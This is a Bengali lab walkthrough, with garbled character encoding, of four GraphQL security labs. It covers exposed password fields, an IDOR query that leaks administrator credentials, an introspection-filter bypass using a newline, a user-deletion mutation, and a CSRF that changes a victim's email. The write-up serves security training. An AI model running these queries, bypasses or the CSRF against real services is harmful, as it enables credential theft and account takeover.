

                                                                              ЁЯФе GraphQL Vulnerabilities 

           ЁЯзк LabтАС1: Lab: Accessing private GraphQL posts

ЁЯФ╣ Step 1: Blog page ржУ GraphQL request ржжрзЗржЦрж╛
Burp ржПрж░ browser ржжрж┐рзЯрзЗ lab ржПрж░ Blog page ржУржкрзЗржи ржХрж░рж┐
Burp тЖТ Proxy > HTTP history
ржжрзЗржЦрж┐ blog post ржЧрзБрж▓рзЛ ржЖрж╕ржЫрзЗ GraphQL query ржжрж┐рзЯрзЗ
Observation:

Blog post ржЧрзБрж▓рзЛрж░ ID sequential
ID = 3 ржирж╛ржЗ тЖТ hidden blog post

ЁЯФ╣ Step 2: Introspection query ржЪрж╛рж▓рж╛ржирзЛ
POST /graphql/v1 request
Right click тЖТ Send to Repeater
Repeater ржП:

Right click тЖТ GraphQL тЖТ Set introspection query
Send
ЁЯУМ Response ржжрзЗржЦрзЗ ржкрж╛ржЗ:

BlogPost {
id
title
postPassword
}

тЮбя╕П postPassword field exposed


ЁЯФ╣ Step 3: Hidden post (id=3) exploit ржХрж░рж╛
GraphQL query:

query getBlogPost($id:Int!) {
blogPost(id:$id){
id
title
postPassword
}
}

Variables:

{ "id": 3 }

ЁЯУе Response:

{
"postPassword": "secretpassword"
}

тЬЕ Password submit ржХрж░рзЗ lab solve

                                                                        ЁЯзк Lab 2: Accidental exposure of private GraphQL fields

ЁЯФ╣ Step 1: Login attempt ржХрж░рж┐
Burp ржПрж░ builtтАСin browser ржУржкрзЗржи ржХрж░рж┐
Lab ржП ржврзБржХрзЗ My account рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рж┐
ржпрзЗржХрзЛржирзЛ ржнрзБрж▓ username / password ржжрж┐рзЯрзЗ login attempt ржХрж░рж┐

ЁЯФ╣ Step 2: Login GraphQL request ржжрзЗржЦрж╛
Burp тЖТ Proxy > HTTP history
ржжрзЗржЦрж┐ login ржХрж░рж╛рж░ рж╕ржорзЯ ржПржХржЯрж╛ request ржпрж╛ржЪрзНржЫрзЗ:
POST /graphql

ржПржЯрж╛ ржПржХржЯрж╛ GraphQL mutation
ржПрж░ ржнрж┐рждрж░рзЗ username ржЖрж░ password ржкрж╛ржарж╛ржирзЛ рж╣ржЪрзНржЫрзЗ
тЮбя╕П ржПржЗ request ржПрж░ ржЙржкрж░
Right click тЖТ Send to Repeater


ЁЯФ╣ Step 3: Introspection query ржЪрж╛рж▓рж╛ржирзЛ
Repeater ржП ржЧрж┐рзЯрзЗ
Request panel ржП right click ржХрж░рж┐
GraphQL тЖТ Set introspection query рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рж┐
рждрж╛рж░ржкрж░ Send
тЮбя╕П ржПрждрзЗ ржХрж░рзЗ ржкрзБрж░рзЛ GraphQL schema ржжрзЗржЦрж╛ ржпрж╛рзЯ


ЁЯФ╣ Step 4: GraphQL queries Site map ржП save ржХрж░рж╛
Repeater ржПрж░ request ржПрж░ ржЙржкрж░
Right click тЖТ GraphQL тЖТ Save GraphQL queries to site map
ржПрж░ржкрж░ ржпрж╛ржЗ:

Burp тЖТ Target > Site map

ЁЯФ╣ Step 5: getUser query ржЦрзБржБржЬрзЗ ржкрж╛ржУрзЯрж╛
Site map ржП ржжрзЗржЦрж┐ ржПржХржЯрж╛ query ржЖржЫрзЗ:

getUser(id) {
username
password
}

тЪая╕П ржмрзЬ рж╕ржорж╕рзНржпрж╛:

рж╢рзБржзрзБ id ржжрж┐рж▓рзЗржЗ
username + password ржжрзБржЯрзЛржЗ ржлрзЗрж░ржд ржжрж┐ржЪрзНржЫрзЗ
тЮбя╕П ржПржЯрж╛ рж╕рзНржкрж╖рзНржЯ IDOR vulnerability

ЁЯФ╣ Step 6: getUser query Repeater ржП ржкрж╛ржарж╛ржирзЛ
getUser query ржПрж░ ржЙржкрж░
Right click тЖТ Send to Repeater
Repeater ржП ржЧрж┐рзЯрзЗ Send ржХрж░рж┐
ЁЯУМ Default ржнрж╛ржмрзЗ:

{ "id": 0 }

ЁЯУе Response:

{
"data": {
"getUser": null
}
}


ЁЯФ╣ Step 7: Administrator ID ржЦрзБржБржЬрзЗ ржмрзЗрж░ ржХрж░рж╛
GraphQL tab тЖТ Variables panel ржП ржЧрж┐рзЯрзЗ
ID ржкрж░рж┐ржмрж░рзНрждржи ржХрж░рж┐:
{ "id": 1 }

ЁЯУе Response:

{
"data": {
"getUser": {
"username": "administrator",
"password": "adminpassword"
}
}
}

тЬЕ Administrator ржПрж░ username ржЖрж░ password ржкрж╛ржУрзЯрж╛ ржЧрзЗрж▓


ЁЯФ╣ Step 8: Admin рж╣рж┐рж╕рзЗржмрзЗ login ржХрж░рж╛
Burp browser ржП ржлрж┐рж░рзЗ ржпрж╛ржЗ
Login ржХрж░рж┐:

Username: administrator
Password: adminpassword
Login рж╕ржлрж▓ тЬЕ


ЁЯФ╣ Step 9: Carlos delete ржХрж░рж╛
Login ржХрж░рж╛рж░ ржкрж░ Admin panel ржП ржпрж╛ржЗ
User list ржерзЗржХрзЗ:

тЬЕ Carlos delete тЖТ lab solved   
         
         ЁЯзк LabтАС3: Finding a hidden GraphQL endpoint

ЁЯФ╣ Step 1: GraphQL endpoint ржЦрзЛржБржЬрж╛ (GET request)
Repeater ржП common endpoint try ржХрж░рж┐:

/api

ЁЯУе Response:

"Query not present"

тЮбя╕П ржмрзЛржЭрж╛ ржЧрзЗрж▓ /api GraphQL GET support ржХрж░рзЗ


ЁЯФ╣ Step 2: Universal query ржжрж┐рзЯрзЗ confirm ржХрж░рж╛
GET /api?query=query{__typename}

ЁЯУе Response:

{
"__typename": "query"
}

тЬЕ /api confirmed GraphQL endpoint


ЁЯФ╣ Step 3: Introspection blocked ржХрж┐ржирзНрждрзБ bypass ржХрж░рж╛
Normal introspection ржжрж┐рж▓рзЗ error:
Introspection is disabled

тЮбя╕П Server regex ржжрж┐рзЯрзЗ block ржХрж░ржЫрзЗ: __schema{

ЁЯФ╣ Bypass trick:
__schema ржПрж░ ржкрж░рзЗ newline (%0a) ржпрзЛржЧ ржХрж░рж┐
ЁЯУМ Result:

Full introspection data ржЪрж▓рзЗ ржЖрж╕рзЗ

ЁЯФ╣ Step 4: getUser query ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ IDOR
Schema ржерзЗржХрзЗ ржкрж╛ржЗ:

getUser(id:Int!)

Test ржХрж░рж┐:

id = 3
ЁЯУе Response:

{
"username": "carlos",
"id": 3
}


ЁЯФ╣ Step 5: deleteOrganizationUser mutation exploit
Schema ржП ржжрзЗржЦрж┐:

deleteOrganizationUser(input:{id})

Final exploit:

/api?query=mutation{deleteOrganizationUser(input:{id:3}){user{id}}}

ЁЯУе Response:

"user": { "id": 3 }

тЬЕ Carlos delete тЖТ lab solved



           ЁЯзк LabтАС4: GraphQL CSRF тАУ Change Email Exploit

ЁЯФ╣ Step 1: Email change request ржжрзЗржЦрж╛
Login тЖТ My account
Email update ржХрж░рж┐
Burp тЖТ HTTP history
Observation:

Email change рж╣ржЪрзНржЫрзЗ GraphQL mutation ржжрж┐рзЯрзЗ

ЁЯФ╣ Step 2: Same session reuse confirm
Request тЖТ Repeater
Email ржЖржмрж╛рж░ ржкрж░рж┐ржмрж░рзНрждржи ржХрж░рж┐
Success response ржкрж╛ржЗ
тЮбя╕П Session cookie reuse ржХрж░рж╛ ржпрж╛ржЪрзНржЫрзЗ


ЁЯФ╣ Step 3: CSRF compatible request ржмрж╛ржирж╛ржирзЛ
Request method тЖТ POST
Header:
Content-Type: application/x-www-form-urlencoded

Body (URL encoded):

query=mutation changeEmail(...) &variables={"email":"hacker@hacker.com"}


ЁЯФ╣ Step 4: CSRF PoC generate ржХрж░рж╛
Right click тЖТ Engagement tools тЖТ Generate CSRF PoC
HTML ржП email ржкрж░рж┐ржмрж░рзНрждржи ржХрж░рж┐ (ржирждрзБржи email ржжрзЗржЗ)

ЁЯФ╣ Step 5: Exploit server ржмрзНржпржмрж╣рж╛рж░
Go to exploit server
HTML paste
Deliver exploit to victim
ЁЯУМ Victim loggedтАСin ржерж╛ржХрж▓рзЗ:

Email attacker email ржП change рж╣рзЯ
тЬЕ Lab solved



